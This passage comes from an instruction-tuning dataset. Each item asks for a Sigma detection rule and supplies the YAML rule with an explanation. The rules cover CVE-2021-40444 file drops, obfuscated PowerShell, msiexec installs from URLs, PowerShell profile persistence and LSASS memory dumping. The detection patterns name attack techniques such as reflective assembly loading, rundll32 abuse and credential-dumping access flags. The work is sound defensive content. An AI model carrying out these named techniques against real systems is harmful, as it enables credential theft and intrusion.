(Velocity template) files, representing potential false positives. Given the severity of what these exceptions might represent, the alert level for such detections is marked as high.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: application\n    product: velocity\n    definition: 'Requirements: application error logs must be collected (with LOG_LEVEL=ERROR and above)'\ndetection:\n    keywords:\n        - 'ParseErrorException'\n        - 'VelocityException'\n        - 'TemplateInitException'\n    condition: keywords\nfalsepositives:\n    - Application bugs\n    - Missing .vm files\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: application\n    product: velocity\n    definition: 'Requirements: application error logs must be collected (with LOG_LEVEL=ERROR and above)'\ndetection:\n    keywords:\n        - 'ParseErrorException'\n        - 'VelocityException'\n        - 'TemplateInitException'\n    condition: keywords\nfalsepositives:\n    - Application bugs\n    - Missing .vm files\nlevel: high\n",
      "question": "exceptions in velocity template renderer, this most likely happens due to dynamic rendering of user input and may lead to RCE.",
      "answer": "In order to detect exceptions in velocity template renderer, this most likely happens due to dynamic rendering of user input and may lead to Remote Code Execution (RCE), you should: Focus on monitoring application error logs specifically within applications that use the velocity template rendering engine. Ensure that these logs have a log level of ERROR or above as specified in the requirements. Detection can be achieved by looking out for specific exception keywords that indicate a problematic state during the rendering process. These keywords include 'ParseErrorException', 'VelocityException', and 'TemplateInitException'. It is essential to monitor for these exceptions because they indicate that something went wrong during the dynamic rendering of user input, which might be an attempt at or indicative of a possible RCE attack. Be aware that there could be certain situations where these alerts might not signify an actual attack but rather stem from internal application bugs or issues like missing '.vm' (Velocity template) files, representing potential false positives. Given the severity of what these exceptions might represent, the alert level for such detections is marked as high."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting file creation patterns noticeable during the exploitation of CVE-2021-40444.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect file creation patterns noticeable during the exploitation of CVE-2021-40444, you should monitor Windows file events for the creation of specific file types associated with this attack by Microsoft Word (winword.exe). Look for instances where files with a '.cab' extension are created in the '\\Windows\\INetCache' directory or when '.inf' files are observed within the '\\AppData\\Local\\Temp\\' path. These can signal malicious actions related to the exploitation. However, it's important to exclude legitimate file creation events, such as when a file named 'Content.inf' is created in the specific, legitimate path 'C:\\Users\\[Username]\\AppData\\Local\\Temp\\'. The focus should be on detecting the unusual creation of '.cab' and '.inf' files following the execution of Word, but not when those creations fall within normal, documented behavior.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: file_event\ndetection:\n    selection_cab:\n        Image|endswith: '\\winword.exe'\n        TargetFilename|contains: '\\Windows\\INetCache'\n        TargetFilename|endswith: '.cab'\n    selection_inf:\n        Image|endswith: '\\winword.exe'\n        TargetFilename|contains|all:\n            - '\\AppData\\Local\\Temp\\'\n            - '.inf'\n    filter_main_legit:\n        TargetFilename|startswith: 'C:\\Users\\'\n        TargetFilename|contains: 'AppData\\Local\\Temp'\n        TargetFilename|endswith: '\\Content.inf'\n    condition: 1 of selection_* and not 1 of filter_main_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: file_event\ndetection:\n    selection_cab:\n        Image|endswith: '\\winword.exe'\n        TargetFilename|contains: '\\Windows\\INetCache'\n        TargetFilename|endswith: '.cab'\n    selection_inf:\n        Image|endswith: '\\winword.exe'\n        TargetFilename|contains|all:\n            - '\\AppData\\Local\\Temp\\'\n            - '.inf'\n    filter_main_legit:\n        TargetFilename|startswith: 'C:\\Users\\'\n        TargetFilename|contains: 'AppData\\Local\\Temp'\n        TargetFilename|endswith: '\\Content.inf'\n    condition: 1 of selection_* and not 1 of filter_main_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "file creation patterns noticeable during the exploitation of CVE-2021-40444",
      "answer": "In order to detect file creation patterns noticeable during the exploitation of CVE-2021-40444, you should monitor Windows file events for the creation of specific file types associated with this attack by Microsoft Word (winword.exe). Look for instances where files with a '.cab' extension are created in the '\\Windows\\INetCache' directory or when '.inf' files are observed within the '\\AppData\\Local\\Temp\\' path. These can signal malicious actions related to the exploitation. However, it's important to exclude legitimate file creation events, such as when a file named 'Content.inf' is created in the specific, legitimate path 'C:\\Users\\[Username]\\AppData\\Local\\Temp\\'. The focus should be on detecting the unusual creation of '.cab' and '.inf' files following the execution of Word, but not when those creations fall within normal, documented behavior."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Obfuscated use of stdin to execute PowerShell.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect obfuscated use of stdin to execute PowerShell, you should monitor Windows PowerShell modules for specific command execution patterns. Focus on observations where command lines include a sequence that involves the 'cmd' command followed by switches '/c' or '/r', which is closely succeeded by 'powershell'. The detection relies on identifying commands that also contain either the `${input}` variable (with optional curly braces) or the 'noexit' flag within a quoted string. This pattern suggests an attempt to execute PowerShell commands in an obfuscated manner, likely to evade detection or analysis. The observation of such a pattern, especially within the context of PowerShell modules, should trigger a high-level alert. It's important to consider that there might be legitimate scenarios that generate similar patterns, though they are not specifically known, indicating the need for thorough investigation once such activity is detected. This approach focuses on PowerShell scripting misuse, aligning with tactics such as Execution and Defense Evasion, particularly when adversaries attempt to run PowerShell commands without drawing attention to their activities.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_module\n    definition: 0ad03ef1-f21b-4a79-8ce8-e6900c54b65b\ndetection:\n    selection_4103:\n        Payload|re: '.*cmd.{0,5}(?:/c|/r).+powershell.+(?:\\$\\{?input\\}?|noexit).+\"'\n    condition: selection_4103\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_module\n    definition: 0ad03ef1-f21b-4a79-8ce8-e6900c54b65b\ndetection:\n    selection_4103:\n        Payload|re: '.*cmd.{0,5}(?:/c|/r).+powershell.+(?:\\$\\{?input\\}?|noexit).+\"'\n    condition: selection_4103\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "Obfuscated use of stdin to execute PowerShell",
      "answer": "In order to detect obfuscated use of stdin to execute PowerShell, you should monitor Windows PowerShell modules for specific command execution patterns. Focus on observations where command lines include a sequence that involves the 'cmd' command followed by switches '/c' or '/r', which is closely succeeded by 'powershell'. The detection relies on identifying commands that also contain either the `${input}` variable (with optional curly braces) or the 'noexit' flag within a quoted string. This pattern suggests an attempt to execute PowerShell commands in an obfuscated manner, likely to evade detection or analysis. The observation of such a pattern, especially within the context of PowerShell modules, should trigger a high-level alert. It's important to consider that there might be legitimate scenarios that generate similar patterns, though they are not specifically known, indicating the need for thorough investigation once such activity is detected. This approach focuses on PowerShell scripting misuse, aligning with tactics such as Execution and Defense Evasion, particularly when adversaries attempt to run PowerShell commands without drawing attention to their activities."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting setting a custom URL for OneDriveStandaloneUpdater.exe to download a file from the Internet without executing any\nanomalous executables with suspicious arguments. The downloaded file will be in C:\\Users\\redacted\\AppData\\Local\\Microsoft\\OneDrive\\StandaloneUpdaterreSignInSettingsConfig.json\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect setting a custom URL for OneDriveStandaloneUpdater.exe to download a file from the Internet without executing any anomalous executables with suspicious arguments, you should: focus on monitoring registry set operations within Windows systems. Specifically, you need to watch for events where the SetValue action is taken on the registry. The critical path to keep an eye on is any modification to '\\SOFTWARE\\Microsoft\\OneDrive\\UpdateOfficeConfig\\UpdateRingSettingURLFromOC' in the registry. It is essential because any changes to this registry entry may indicate an attempt to redirect the OneDrive standalone updater to download potentially malicious files from a custom URL. This monitoring approach does not expect known false positives; however, it remains crucial to maintain vigilance for any unknown falsepositives that may arise. The detection of such a configuration change is deemed to have a high level of importance due to its potential misuse in cyber attacks, specifically targeting how software updates and configurations can be manipulated to facilitate unauthorized downloads from the internet.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|contains: '\\SOFTWARE\\Microsoft\\OneDrive\\UpdateOfficeConfig\\UpdateRingSettingURLFromOC'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|contains: '\\SOFTWARE\\Microsoft\\OneDrive\\UpdateOfficeConfig\\UpdateRingSettingURLFromOC'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "setting a custom URL for OneDriveStandaloneUpdater.exe to download a file from the Internet without executing any\nanomalous executables with suspicious arguments. The downloaded file will be in C:\\Users\\redacted\\AppData\\Local\\Microsoft\\OneDrive\\StandaloneUpdaterreSignInSettingsConfig.json\n",
      "answer": "In order to detect setting a custom URL for OneDriveStandaloneUpdater.exe to download a file from the Internet without executing any anomalous executables with suspicious arguments, you should: focus on monitoring registry set operations within Windows systems. Specifically, you need to watch for events where the SetValue action is taken on the registry. The critical path to keep an eye on is any modification to '\\SOFTWARE\\Microsoft\\OneDrive\\UpdateOfficeConfig\\UpdateRingSettingURLFromOC' in the registry. It is essential because any changes to this registry entry may indicate an attempt to redirect the OneDrive standalone updater to download potentially malicious files from a custom URL. This monitoring approach does not expect known false positives; however, it remains crucial to maintain vigilance for any unknown falsepositives that may arise. The detection of such a configuration change is deemed to have a high level of importance due to its potential misuse in cyber attacks, specifically targeting how software updates and configurations can be manipulated to facilitate unauthorized downloads from the internet."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting changes to the EC2 instance startup script. The shell script will be executed as root/SYSTEM every time the specific instances are booted up..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect changes to the EC2 instance startup script, which will be executed as root/SYSTEM every time the specific instances are booted up, you should: Monitor AWS CloudTrail logs for any event related to modifying an EC2 instance's attributes, specifically focusing on changes made to the `userData` field, which is used to manage the instance's startup script. Key indicators of this activity include logs from the `ec2.amazonaws.com` event source where the `eventName` is `ModifyInstanceAttribute`, and the modification is regarding the `userData` attribute. Be aware that legitimate alterations to the startup script could also trigger an alert, such as valid changes during regular maintenance or updates. This kind of monitoring is critical as it pertains to detecting potential unauthorized modifications, aimed at persisting malicious activities within cloud environments. Such activities are highlighted due to their potential impact and the high level of access that modifications to the startup scripts can provide to an attacker, running with root or SYSTEM privileges every time the instance is initiated.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: aws\n    service: cloudtrail\ndetection:\n    selection_source:\n        eventSource: ec2.amazonaws.com\n        requestParameters.attribute: 'userData'\n        eventName: ModifyInstanceAttribute\n    condition: selection_source\nfalsepositives:\n    - Valid changes to the startup script\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: aws\n    service: cloudtrail\ndetection:\n    selection_source:\n        eventSource: ec2.amazonaws.com\n        requestParameters.attribute: 'userData'\n        eventName: ModifyInstanceAttribute\n    condition: selection_source\nfalsepositives:\n    - Valid changes to the startup script\nlevel: high\n",
      "question": "changes to the EC2 instance startup script. The shell script will be executed as root/SYSTEM every time the specific instances are booted up.",
      "answer": "In order to detect changes to the EC2 instance startup script, which will be executed as root/SYSTEM every time the specific instances are booted up, you should: Monitor AWS CloudTrail logs for any event related to modifying an EC2 instance's attributes, specifically focusing on changes made to the `userData` field, which is used to manage the instance's startup script. Key indicators of this activity include logs from the `ec2.amazonaws.com` event source where the `eventName` is `ModifyInstanceAttribute`, and the modification is regarding the `userData` attribute. Be aware that legitimate alterations to the startup script could also trigger an alert, such as valid changes during regular maintenance or updates. This kind of monitoring is critical as it pertains to detecting potential unauthorized modifications, aimed at persisting malicious activities within cloud environments. Such activities are highlighted due to their potential impact and the high level of access that modifications to the startup scripts can provide to an attacker, running with root or SYSTEM privileges every time the instance is initiated."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting creation or modification of a powershell profile which could indicate suspicious activity as the profile can be used as a mean of persistence.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the creation or modification of a PowerShell profile which could indicate suspicious activity as the profile can be used as a means of persistence, you should: Monitor Windows file events for any creation or modification actions targeting specific PowerShell profile scripts. These profile scripts include '\\Microsoft.PowerShell_profile.ps1', '\\WindowsPowerShell\\profile.ps1', '\\PowerShell\\profile.ps1', '\\Windows\\System32\\WindowsPowerShell\\v1.0\\profile.ps1', and '\\Program Files\\PowerShell\\7\\profile.ps1'. It's crucial to note that while detecting these changes is essential for identifying potential malicious activities, there are legitimate scenarios where a system administrator might manually create or modify these PowerShell profiles. Consequently, these legitimate activities are considered false positives. This detection strategy is of high importance due to the risk associated with PowerShell profiles being used for persistence mechanisms by attackers.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: file_event\ndetection:\n    selection:\n        TargetFilename|endswith:\n            - '\\Microsoft.PowerShell_profile.ps1'\n            - '\\WindowsPowerShell\\profile.ps1'\n            - '\\PowerShell\\profile.ps1'\n            - '\\Windows\\System32\\WindowsPowerShell\\v1.0\\profile.ps1'\n            - '\\Program Files\\PowerShell\\7\\profile.ps1'\n    condition: selection\nfalsepositives:\n    - System administrator creating Powershell profile manually\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: file_event\ndetection:\n    selection:\n        TargetFilename|endswith:\n            - '\\Microsoft.PowerShell_profile.ps1'\n            - '\\WindowsPowerShell\\profile.ps1'\n            - '\\PowerShell\\profile.ps1'\n            - '\\Windows\\System32\\WindowsPowerShell\\v1.0\\profile.ps1'\n            - '\\Program Files\\PowerShell\\7\\profile.ps1'\n    condition: selection\nfalsepositives:\n    - System administrator creating Powershell profile manually\nlevel: high\n",
      "question": "creation or modification of a powershell profile which could indicate suspicious activity as the profile can be used as a mean of persistence",
      "answer": "In order to detect the creation or modification of a PowerShell profile which could indicate suspicious activity as the profile can be used as a means of persistence, you should: Monitor Windows file events for any creation or modification actions targeting specific PowerShell profile scripts. These profile scripts include '\\Microsoft.PowerShell_profile.ps1', '\\WindowsPowerShell\\profile.ps1', '\\PowerShell\\profile.ps1', '\\Windows\\System32\\WindowsPowerShell\\v1.0\\profile.ps1', and '\\Program Files\\PowerShell\\7\\profile.ps1'. It's crucial to note that while detecting these changes is essential for identifying potential malicious activities, there are legitimate scenarios where a system administrator might manually create or modify these PowerShell profiles. Consequently, these legitimate activities are considered false positives. This detection strategy is of high importance due to the risk associated with PowerShell profiles being used for persistence mechanisms by attackers."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Monitor and alert for Sign-ins by unknown devices from non-Trusted locations..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to Monitor and alert for Sign-ins by unknown devices from non-Trusted locations, you should: Focus on monitoring sign-in logs in Azure environments. Particularly, you will need to keep an eye on sign-in attempts that meet specific criteria indicating potential security risks. This involves looking for sign-ins that are performed using single-factor authentication, which is considered less secure compared to multi-factor authentication methods. Additionally, you should pay attention to sign-ins that result in a successful login (indicated by ResultType 0), but somewhat suspiciously, do not provide any network location details or device identifiers. Such sign-ins could suggest that an unknown device, possibly from a non-trusted location, is trying to access the system. Despite these indicators potentially signaling unauthorized access attempts, it's important to consider that there might be instances of false positives, where legitimate sign-ins are erroneously flagged due to lack of information. The security level for these detections is considered low, implying that while they should not be ignored, they may not always represent critical threats. Tags associated with this activity include tactics and techniques related to Initial Access, which might involve adversaries attempting to gain entry into your network.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: azure\n    service: signinlogs\ndetection:\n    selection:\n        AuthenticationRequirement: singleFactorAuthentication\n        ResultType: 0\n        NetworkLocationDetails: '[]'\n        DeviceDetail.deviceId: ''\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: azure\n    service: signinlogs\ndetection:\n    selection:\n        AuthenticationRequirement: singleFactorAuthentication\n        ResultType: 0\n        NetworkLocationDetails: '[]'\n        DeviceDetail.deviceId: ''\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: low\n",
      "question": "Monitor and alert for Sign-ins by unknown devices from non-Trusted locations.",
      "answer": "In order to Monitor and alert for Sign-ins by unknown devices from non-Trusted locations, you should: Focus on monitoring sign-in logs in Azure environments. Particularly, you will need to keep an eye on sign-in attempts that meet specific criteria indicating potential security risks. This involves looking for sign-ins that are performed using single-factor authentication, which is considered less secure compared to multi-factor authentication methods. Additionally, you should pay attention to sign-ins that result in a successful login (indicated by ResultType 0), but somewhat suspiciously, do not provide any network location details or device identifiers. Such sign-ins could suggest that an unknown device, possibly from a non-trusted location, is trying to access the system. Despite these indicators potentially signaling unauthorized access attempts, it's important to consider that there might be instances of false positives, where legitimate sign-ins are erroneously flagged due to lack of information. The security level for these detections is considered low, implying that while they should not be ignored, they may not always represent critical threats. Tags associated with this activity include tactics and techniques related to Initial Access, which might involve adversaries attempting to gain entry into your network."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting child processes of \"dfsvc\" which indicates a ClickOnce deployment execution..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect child processes of \"dfsvc\" which indicates a ClickOnce deployment execution, you should: Monitor process creation logs on Windows systems, especially focusing on parent processes ending with \"\\dfsvc.exe\" and child processes that originate from paths ending with \"\\AppData\\Local\\Apps\\2.0\\\". This monitoring helps in identifying potential misuses of ClickOnce deployment for executing malicious activities. However, be aware that legitimate ClickOnce deployments will trigger this detection, so it's essential to perform an initial baselining of your environment to distinguish between benign and suspicious activities. The security level for this detection is considered medium.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\dfsvc.exe'\n        Image|endswith: '\\AppData\\Local\\Apps\\2.0\\'\n    condition: selection\nfalsepositives:\n    - False positives are expected in environement leveraging ClickOnce deployments. An initial baselining is required before using this rule in production.\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\dfsvc.exe'\n        Image|endswith: '\\AppData\\Local\\Apps\\2.0\\'\n    condition: selection\nfalsepositives:\n    - False positives are expected in environement leveraging ClickOnce deployments. An initial baselining is required before using this rule in production.\nlevel: medium\n",
      "question": "child processes of \"dfsvc\" which indicates a ClickOnce deployment execution.",
      "answer": "In order to detect child processes of \"dfsvc\" which indicates a ClickOnce deployment execution, you should: Monitor process creation logs on Windows systems, especially focusing on parent processes ending with \"\\dfsvc.exe\" and child processes that originate from paths ending with \"\\AppData\\Local\\Apps\\2.0\\\". This monitoring helps in identifying potential misuses of ClickOnce deployment for executing malicious activities. However, be aware that legitimate ClickOnce deployments will trigger this detection, so it's essential to perform an initial baselining of your environment to distinguish between benign and suspicious activities. The security level for this detection is considered medium."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting potentially suspicious keywords that could indicate the use of a PowerShell exploitation framework.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect potentially suspicious keywords that could indicate the use of a PowerShell exploitation framework, you should: focus on monitoring PowerShell script activities within Windows environments where Script Block Logging is enabled. Specifically, look for the presence of any of these indicative keywords or phrases within the script text: usage of 'System.Reflection.Assembly.Load($', '[System.Reflection.Assembly]::Load($', '[Reflection.Assembly]::Load($' for dynamically loading assemblies, references to 'System.Reflection.AssemblyName' for dealing with assembly names, 'Reflection.Emit.AssemblyBuilderAccess' and 'Reflection.Emit.CustomAttributeBuilder' that are associated with the creation of assemblies and custom attributes at runtime, 'Runtime.InteropServices.UnmanagedType' and 'Runtime.InteropServices.DllImportAttribute' related to invoking unmanaged code, 'SuspendThread' indicating potential thread manipulation, and 'rundll32', a utility that can be used maliciously to execute code. It's important to be vigilant about these indicators as they might be employed in crafting PowerShell-based exploits, although be aware that there can be legitimate uses of these terms, so unknown false positives can occur. The detection is of a medium risk level, suggesting that while these indicators are not definitively malicious on their own, their presence warrants further investigation.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains:\n            - 'System.Reflection.Assembly.Load($'\n            - '[System.Reflection.Assembly]::Load($'\n            - '[Reflection.Assembly]::Load($'\n            - 'System.Reflection.AssemblyName'\n            - 'Reflection.Emit.AssemblyBuilderAccess'\n            - 'Reflection.Emit.CustomAttributeBuilder'\n            - 'Runtime.InteropServices.UnmanagedType'\n            - 'Runtime.InteropServices.DllImportAttribute'\n            - 'SuspendThread'\n            - 'rundll32'\n            # - 'FromBase64'\n            #- 'Invoke-WMIMethod' # Prone to FP\n            #- 'http://127.0.0.1' # Prone to FP\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains:\n            - 'System.Reflection.Assembly.Load($'\n            - '[System.Reflection.Assembly]::Load($'\n            - '[Reflection.Assembly]::Load($'\n            - 'System.Reflection.AssemblyName'\n            - 'Reflection.Emit.AssemblyBuilderAccess'\n            - 'Reflection.Emit.CustomAttributeBuilder'\n            - 'Runtime.InteropServices.UnmanagedType'\n            - 'Runtime.InteropServices.DllImportAttribute'\n            - 'SuspendThread'\n            - 'rundll32'\n            # - 'FromBase64'\n            #- 'Invoke-WMIMethod' # Prone to FP\n            #- 'http://127.0.0.1' # Prone to FP\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "potentially suspicious keywords that could indicate the use of a PowerShell exploitation framework",
      "answer": "In order to detect potentially suspicious keywords that could indicate the use of a PowerShell exploitation framework, you should: focus on monitoring PowerShell script activities within Windows environments where Script Block Logging is enabled. Specifically, look for the presence of any of these indicative keywords or phrases within the script text: usage of 'System.Reflection.Assembly.Load($', '[System.Reflection.Assembly]::Load($', '[Reflection.Assembly]::Load($' for dynamically loading assemblies, references to 'System.Reflection.AssemblyName' for dealing with assembly names, 'Reflection.Emit.AssemblyBuilderAccess' and 'Reflection.Emit.CustomAttributeBuilder' that are associated with the creation of assemblies and custom attributes at runtime, 'Runtime.InteropServices.UnmanagedType' and 'Runtime.InteropServices.DllImportAttribute' related to invoking unmanaged code, 'SuspendThread' indicating potential thread manipulation, and 'rundll32', a utility that can be used maliciously to execute code. It's important to be vigilant about these indicators as they might be employed in crafting PowerShell-based exploits, although be aware that there can be legitimate uses of these terms, so unknown false positives can occur. The detection is of a medium risk level, suggesting that while these indicators are not definitively malicious on their own, their presence warrants further investigation."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious msiexec process starts with web addresses as parameter.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious msiexec process starts with web addresses as parameter, you should: Monitor process creation logs in Windows environments for instances where the command line contains both 'msiexec' and a web address indicator (denoted by '://'). This activity is indicative of attempts to execute or install software directly from a web address using the Microsoft Installer Service (msiexec), which can be a method used by attackers to deploy malware or unwanted software. It is important to note that while this behavior can signal malicious intent, there can be legitimate administrative tools and scripts that also use this pattern, so potential false positives should be considered and investigated accordingly. The detection of such patterns is crucial for identifying potential threats and falls under medium severity level due to its implications for system security.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - ' msiexec'\n            - '://'\n    condition: selection\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - ' msiexec'\n            - '://'\n    condition: selection\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: medium\n",
      "question": "suspicious msiexec process starts with web addresses as parameter",
      "answer": "In order to detect suspicious msiexec process starts with web addresses as parameter, you should: Monitor process creation logs in Windows environments for instances where the command line contains both 'msiexec' and a web address indicator (denoted by '://'). This activity is indicative of attempts to execute or install software directly from a web address using the Microsoft Installer Service (msiexec), which can be a method used by attackers to deploy malware or unwanted software. It is important to note that while this behavior can signal malicious intent, there can be legitimate administrative tools and scripts that also use this pattern, so potential false positives should be considered and investigated accordingly. The detection of such patterns is crucial for identifying potential threats and falls under medium severity level due to its implications for system security."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting use of the 'Pubprn.vbs' Microsoft signed script to execute commands..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the use of the 'Pubprn.vbs' Microsoft signed script to execute commands, you should monitor the creation of processes on Windows operating systems. Specifically, look for instances where the command line contains both '\\pubprn.vbs' and 'script:'. This pattern suggests that the Pubprn.vbs script is being utilized to run commands, which could be indicative of malicious activity. The detection urgency for this behavior is categorized as medium, though it\u2019s important to consider that false positives may occur, the specifics of which are not currently known or predictable.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - '\\pubprn.vbs'\n            - 'script:'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - '\\pubprn.vbs'\n            - 'script:'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "use of the 'Pubprn.vbs' Microsoft signed script to execute commands.",
      "answer": "In order to detect the use of the 'Pubprn.vbs' Microsoft signed script to execute commands, you should monitor the creation of processes on Windows operating systems. Specifically, look for instances where the command line contains both '\\pubprn.vbs' and 'script:'. This pattern suggests that the Pubprn.vbs script is being utilized to run commands, which could be indicative of malicious activity. The detection urgency for this behavior is categorized as medium, though it\u2019s important to consider that false positives may occur, the specifics of which are not currently known or predictable."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting process LSASS memory dump using Mimikatz, NanoDump, Invoke-Mimikatz, Procdump or Taskmgr based on the CallTrace pointing to ntdll.dll, dbghelp.dll or dbgcore.dll for win10, server2016 and up..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect process LSASS memory dump using Mimikatz, NanoDump, Invoke-Mimikatz, Procdump or Taskmgr based on the CallTrace pointing to ntdll.dll, dbghelp.dll or dbgcore.dll for win10, server2016 and up, you should: Focus on monitoring process access within Windows environments, specifically observing attempts to access the Local Security Authority Subsystem Service (lsass.exe). This involves looking for access patterns that include specific GrantedAccess flags such as '0x1038', '0x1438', and '0x143a'. These access flags are critical hints towards unauthorized or suspicious activities, intending to manipulate or dump the memory of the lsass.exe process, which is a common target for attackers seeking to extract sensitive authentication credentials.\n\nAdditionally, pay close attention to the Call Trace logs for indications that the access attempts involve significant system DLLs such as dbghelp.dll, dbgcore.dll, and ntdll.dll. These DLLs are typically employed in legitimate debugging activities but can be misused for dumping memory content, especially in the context of sophisticated credential theft attacks.\n\nTo minimize false positives and refine detection accuracy, it is advisable to consider the context and source of the process access attempt. For instance, filtering out events originating from known system management and monitoring tools or from within temporary directories commonly used by legitimate applications for extraction or temporary storage. This can be achieved by excluding access attempts linked to specific CallTraces like those originating from the C:\\Windows\\Temp\\ directory, or explicitly from Sysmon (System Monitor) activities, indicating the event was captured by a system monitoring tool rather than being an unauthorized access attempt.\n\nIt is also important to be aware of the potential for false positives, particularly with certain access codes, and to apply exclusions or additional scrutiny as needed to differentiate between malicious activities and legitimate system or administrative operations.\n\nBy carefully monitoring these signals and filtering out known benign activities, it's possible to significantly enhance the detection of unauthorized LSASS memory dumping attempts. These attempts are often indicators of advanced credential theft operations targeting Windows 10, Server 2016, and newer systems, employing tools like Mimikatz, NanoDump, and others specialized in extracting sensitive data.",
    "context": "",
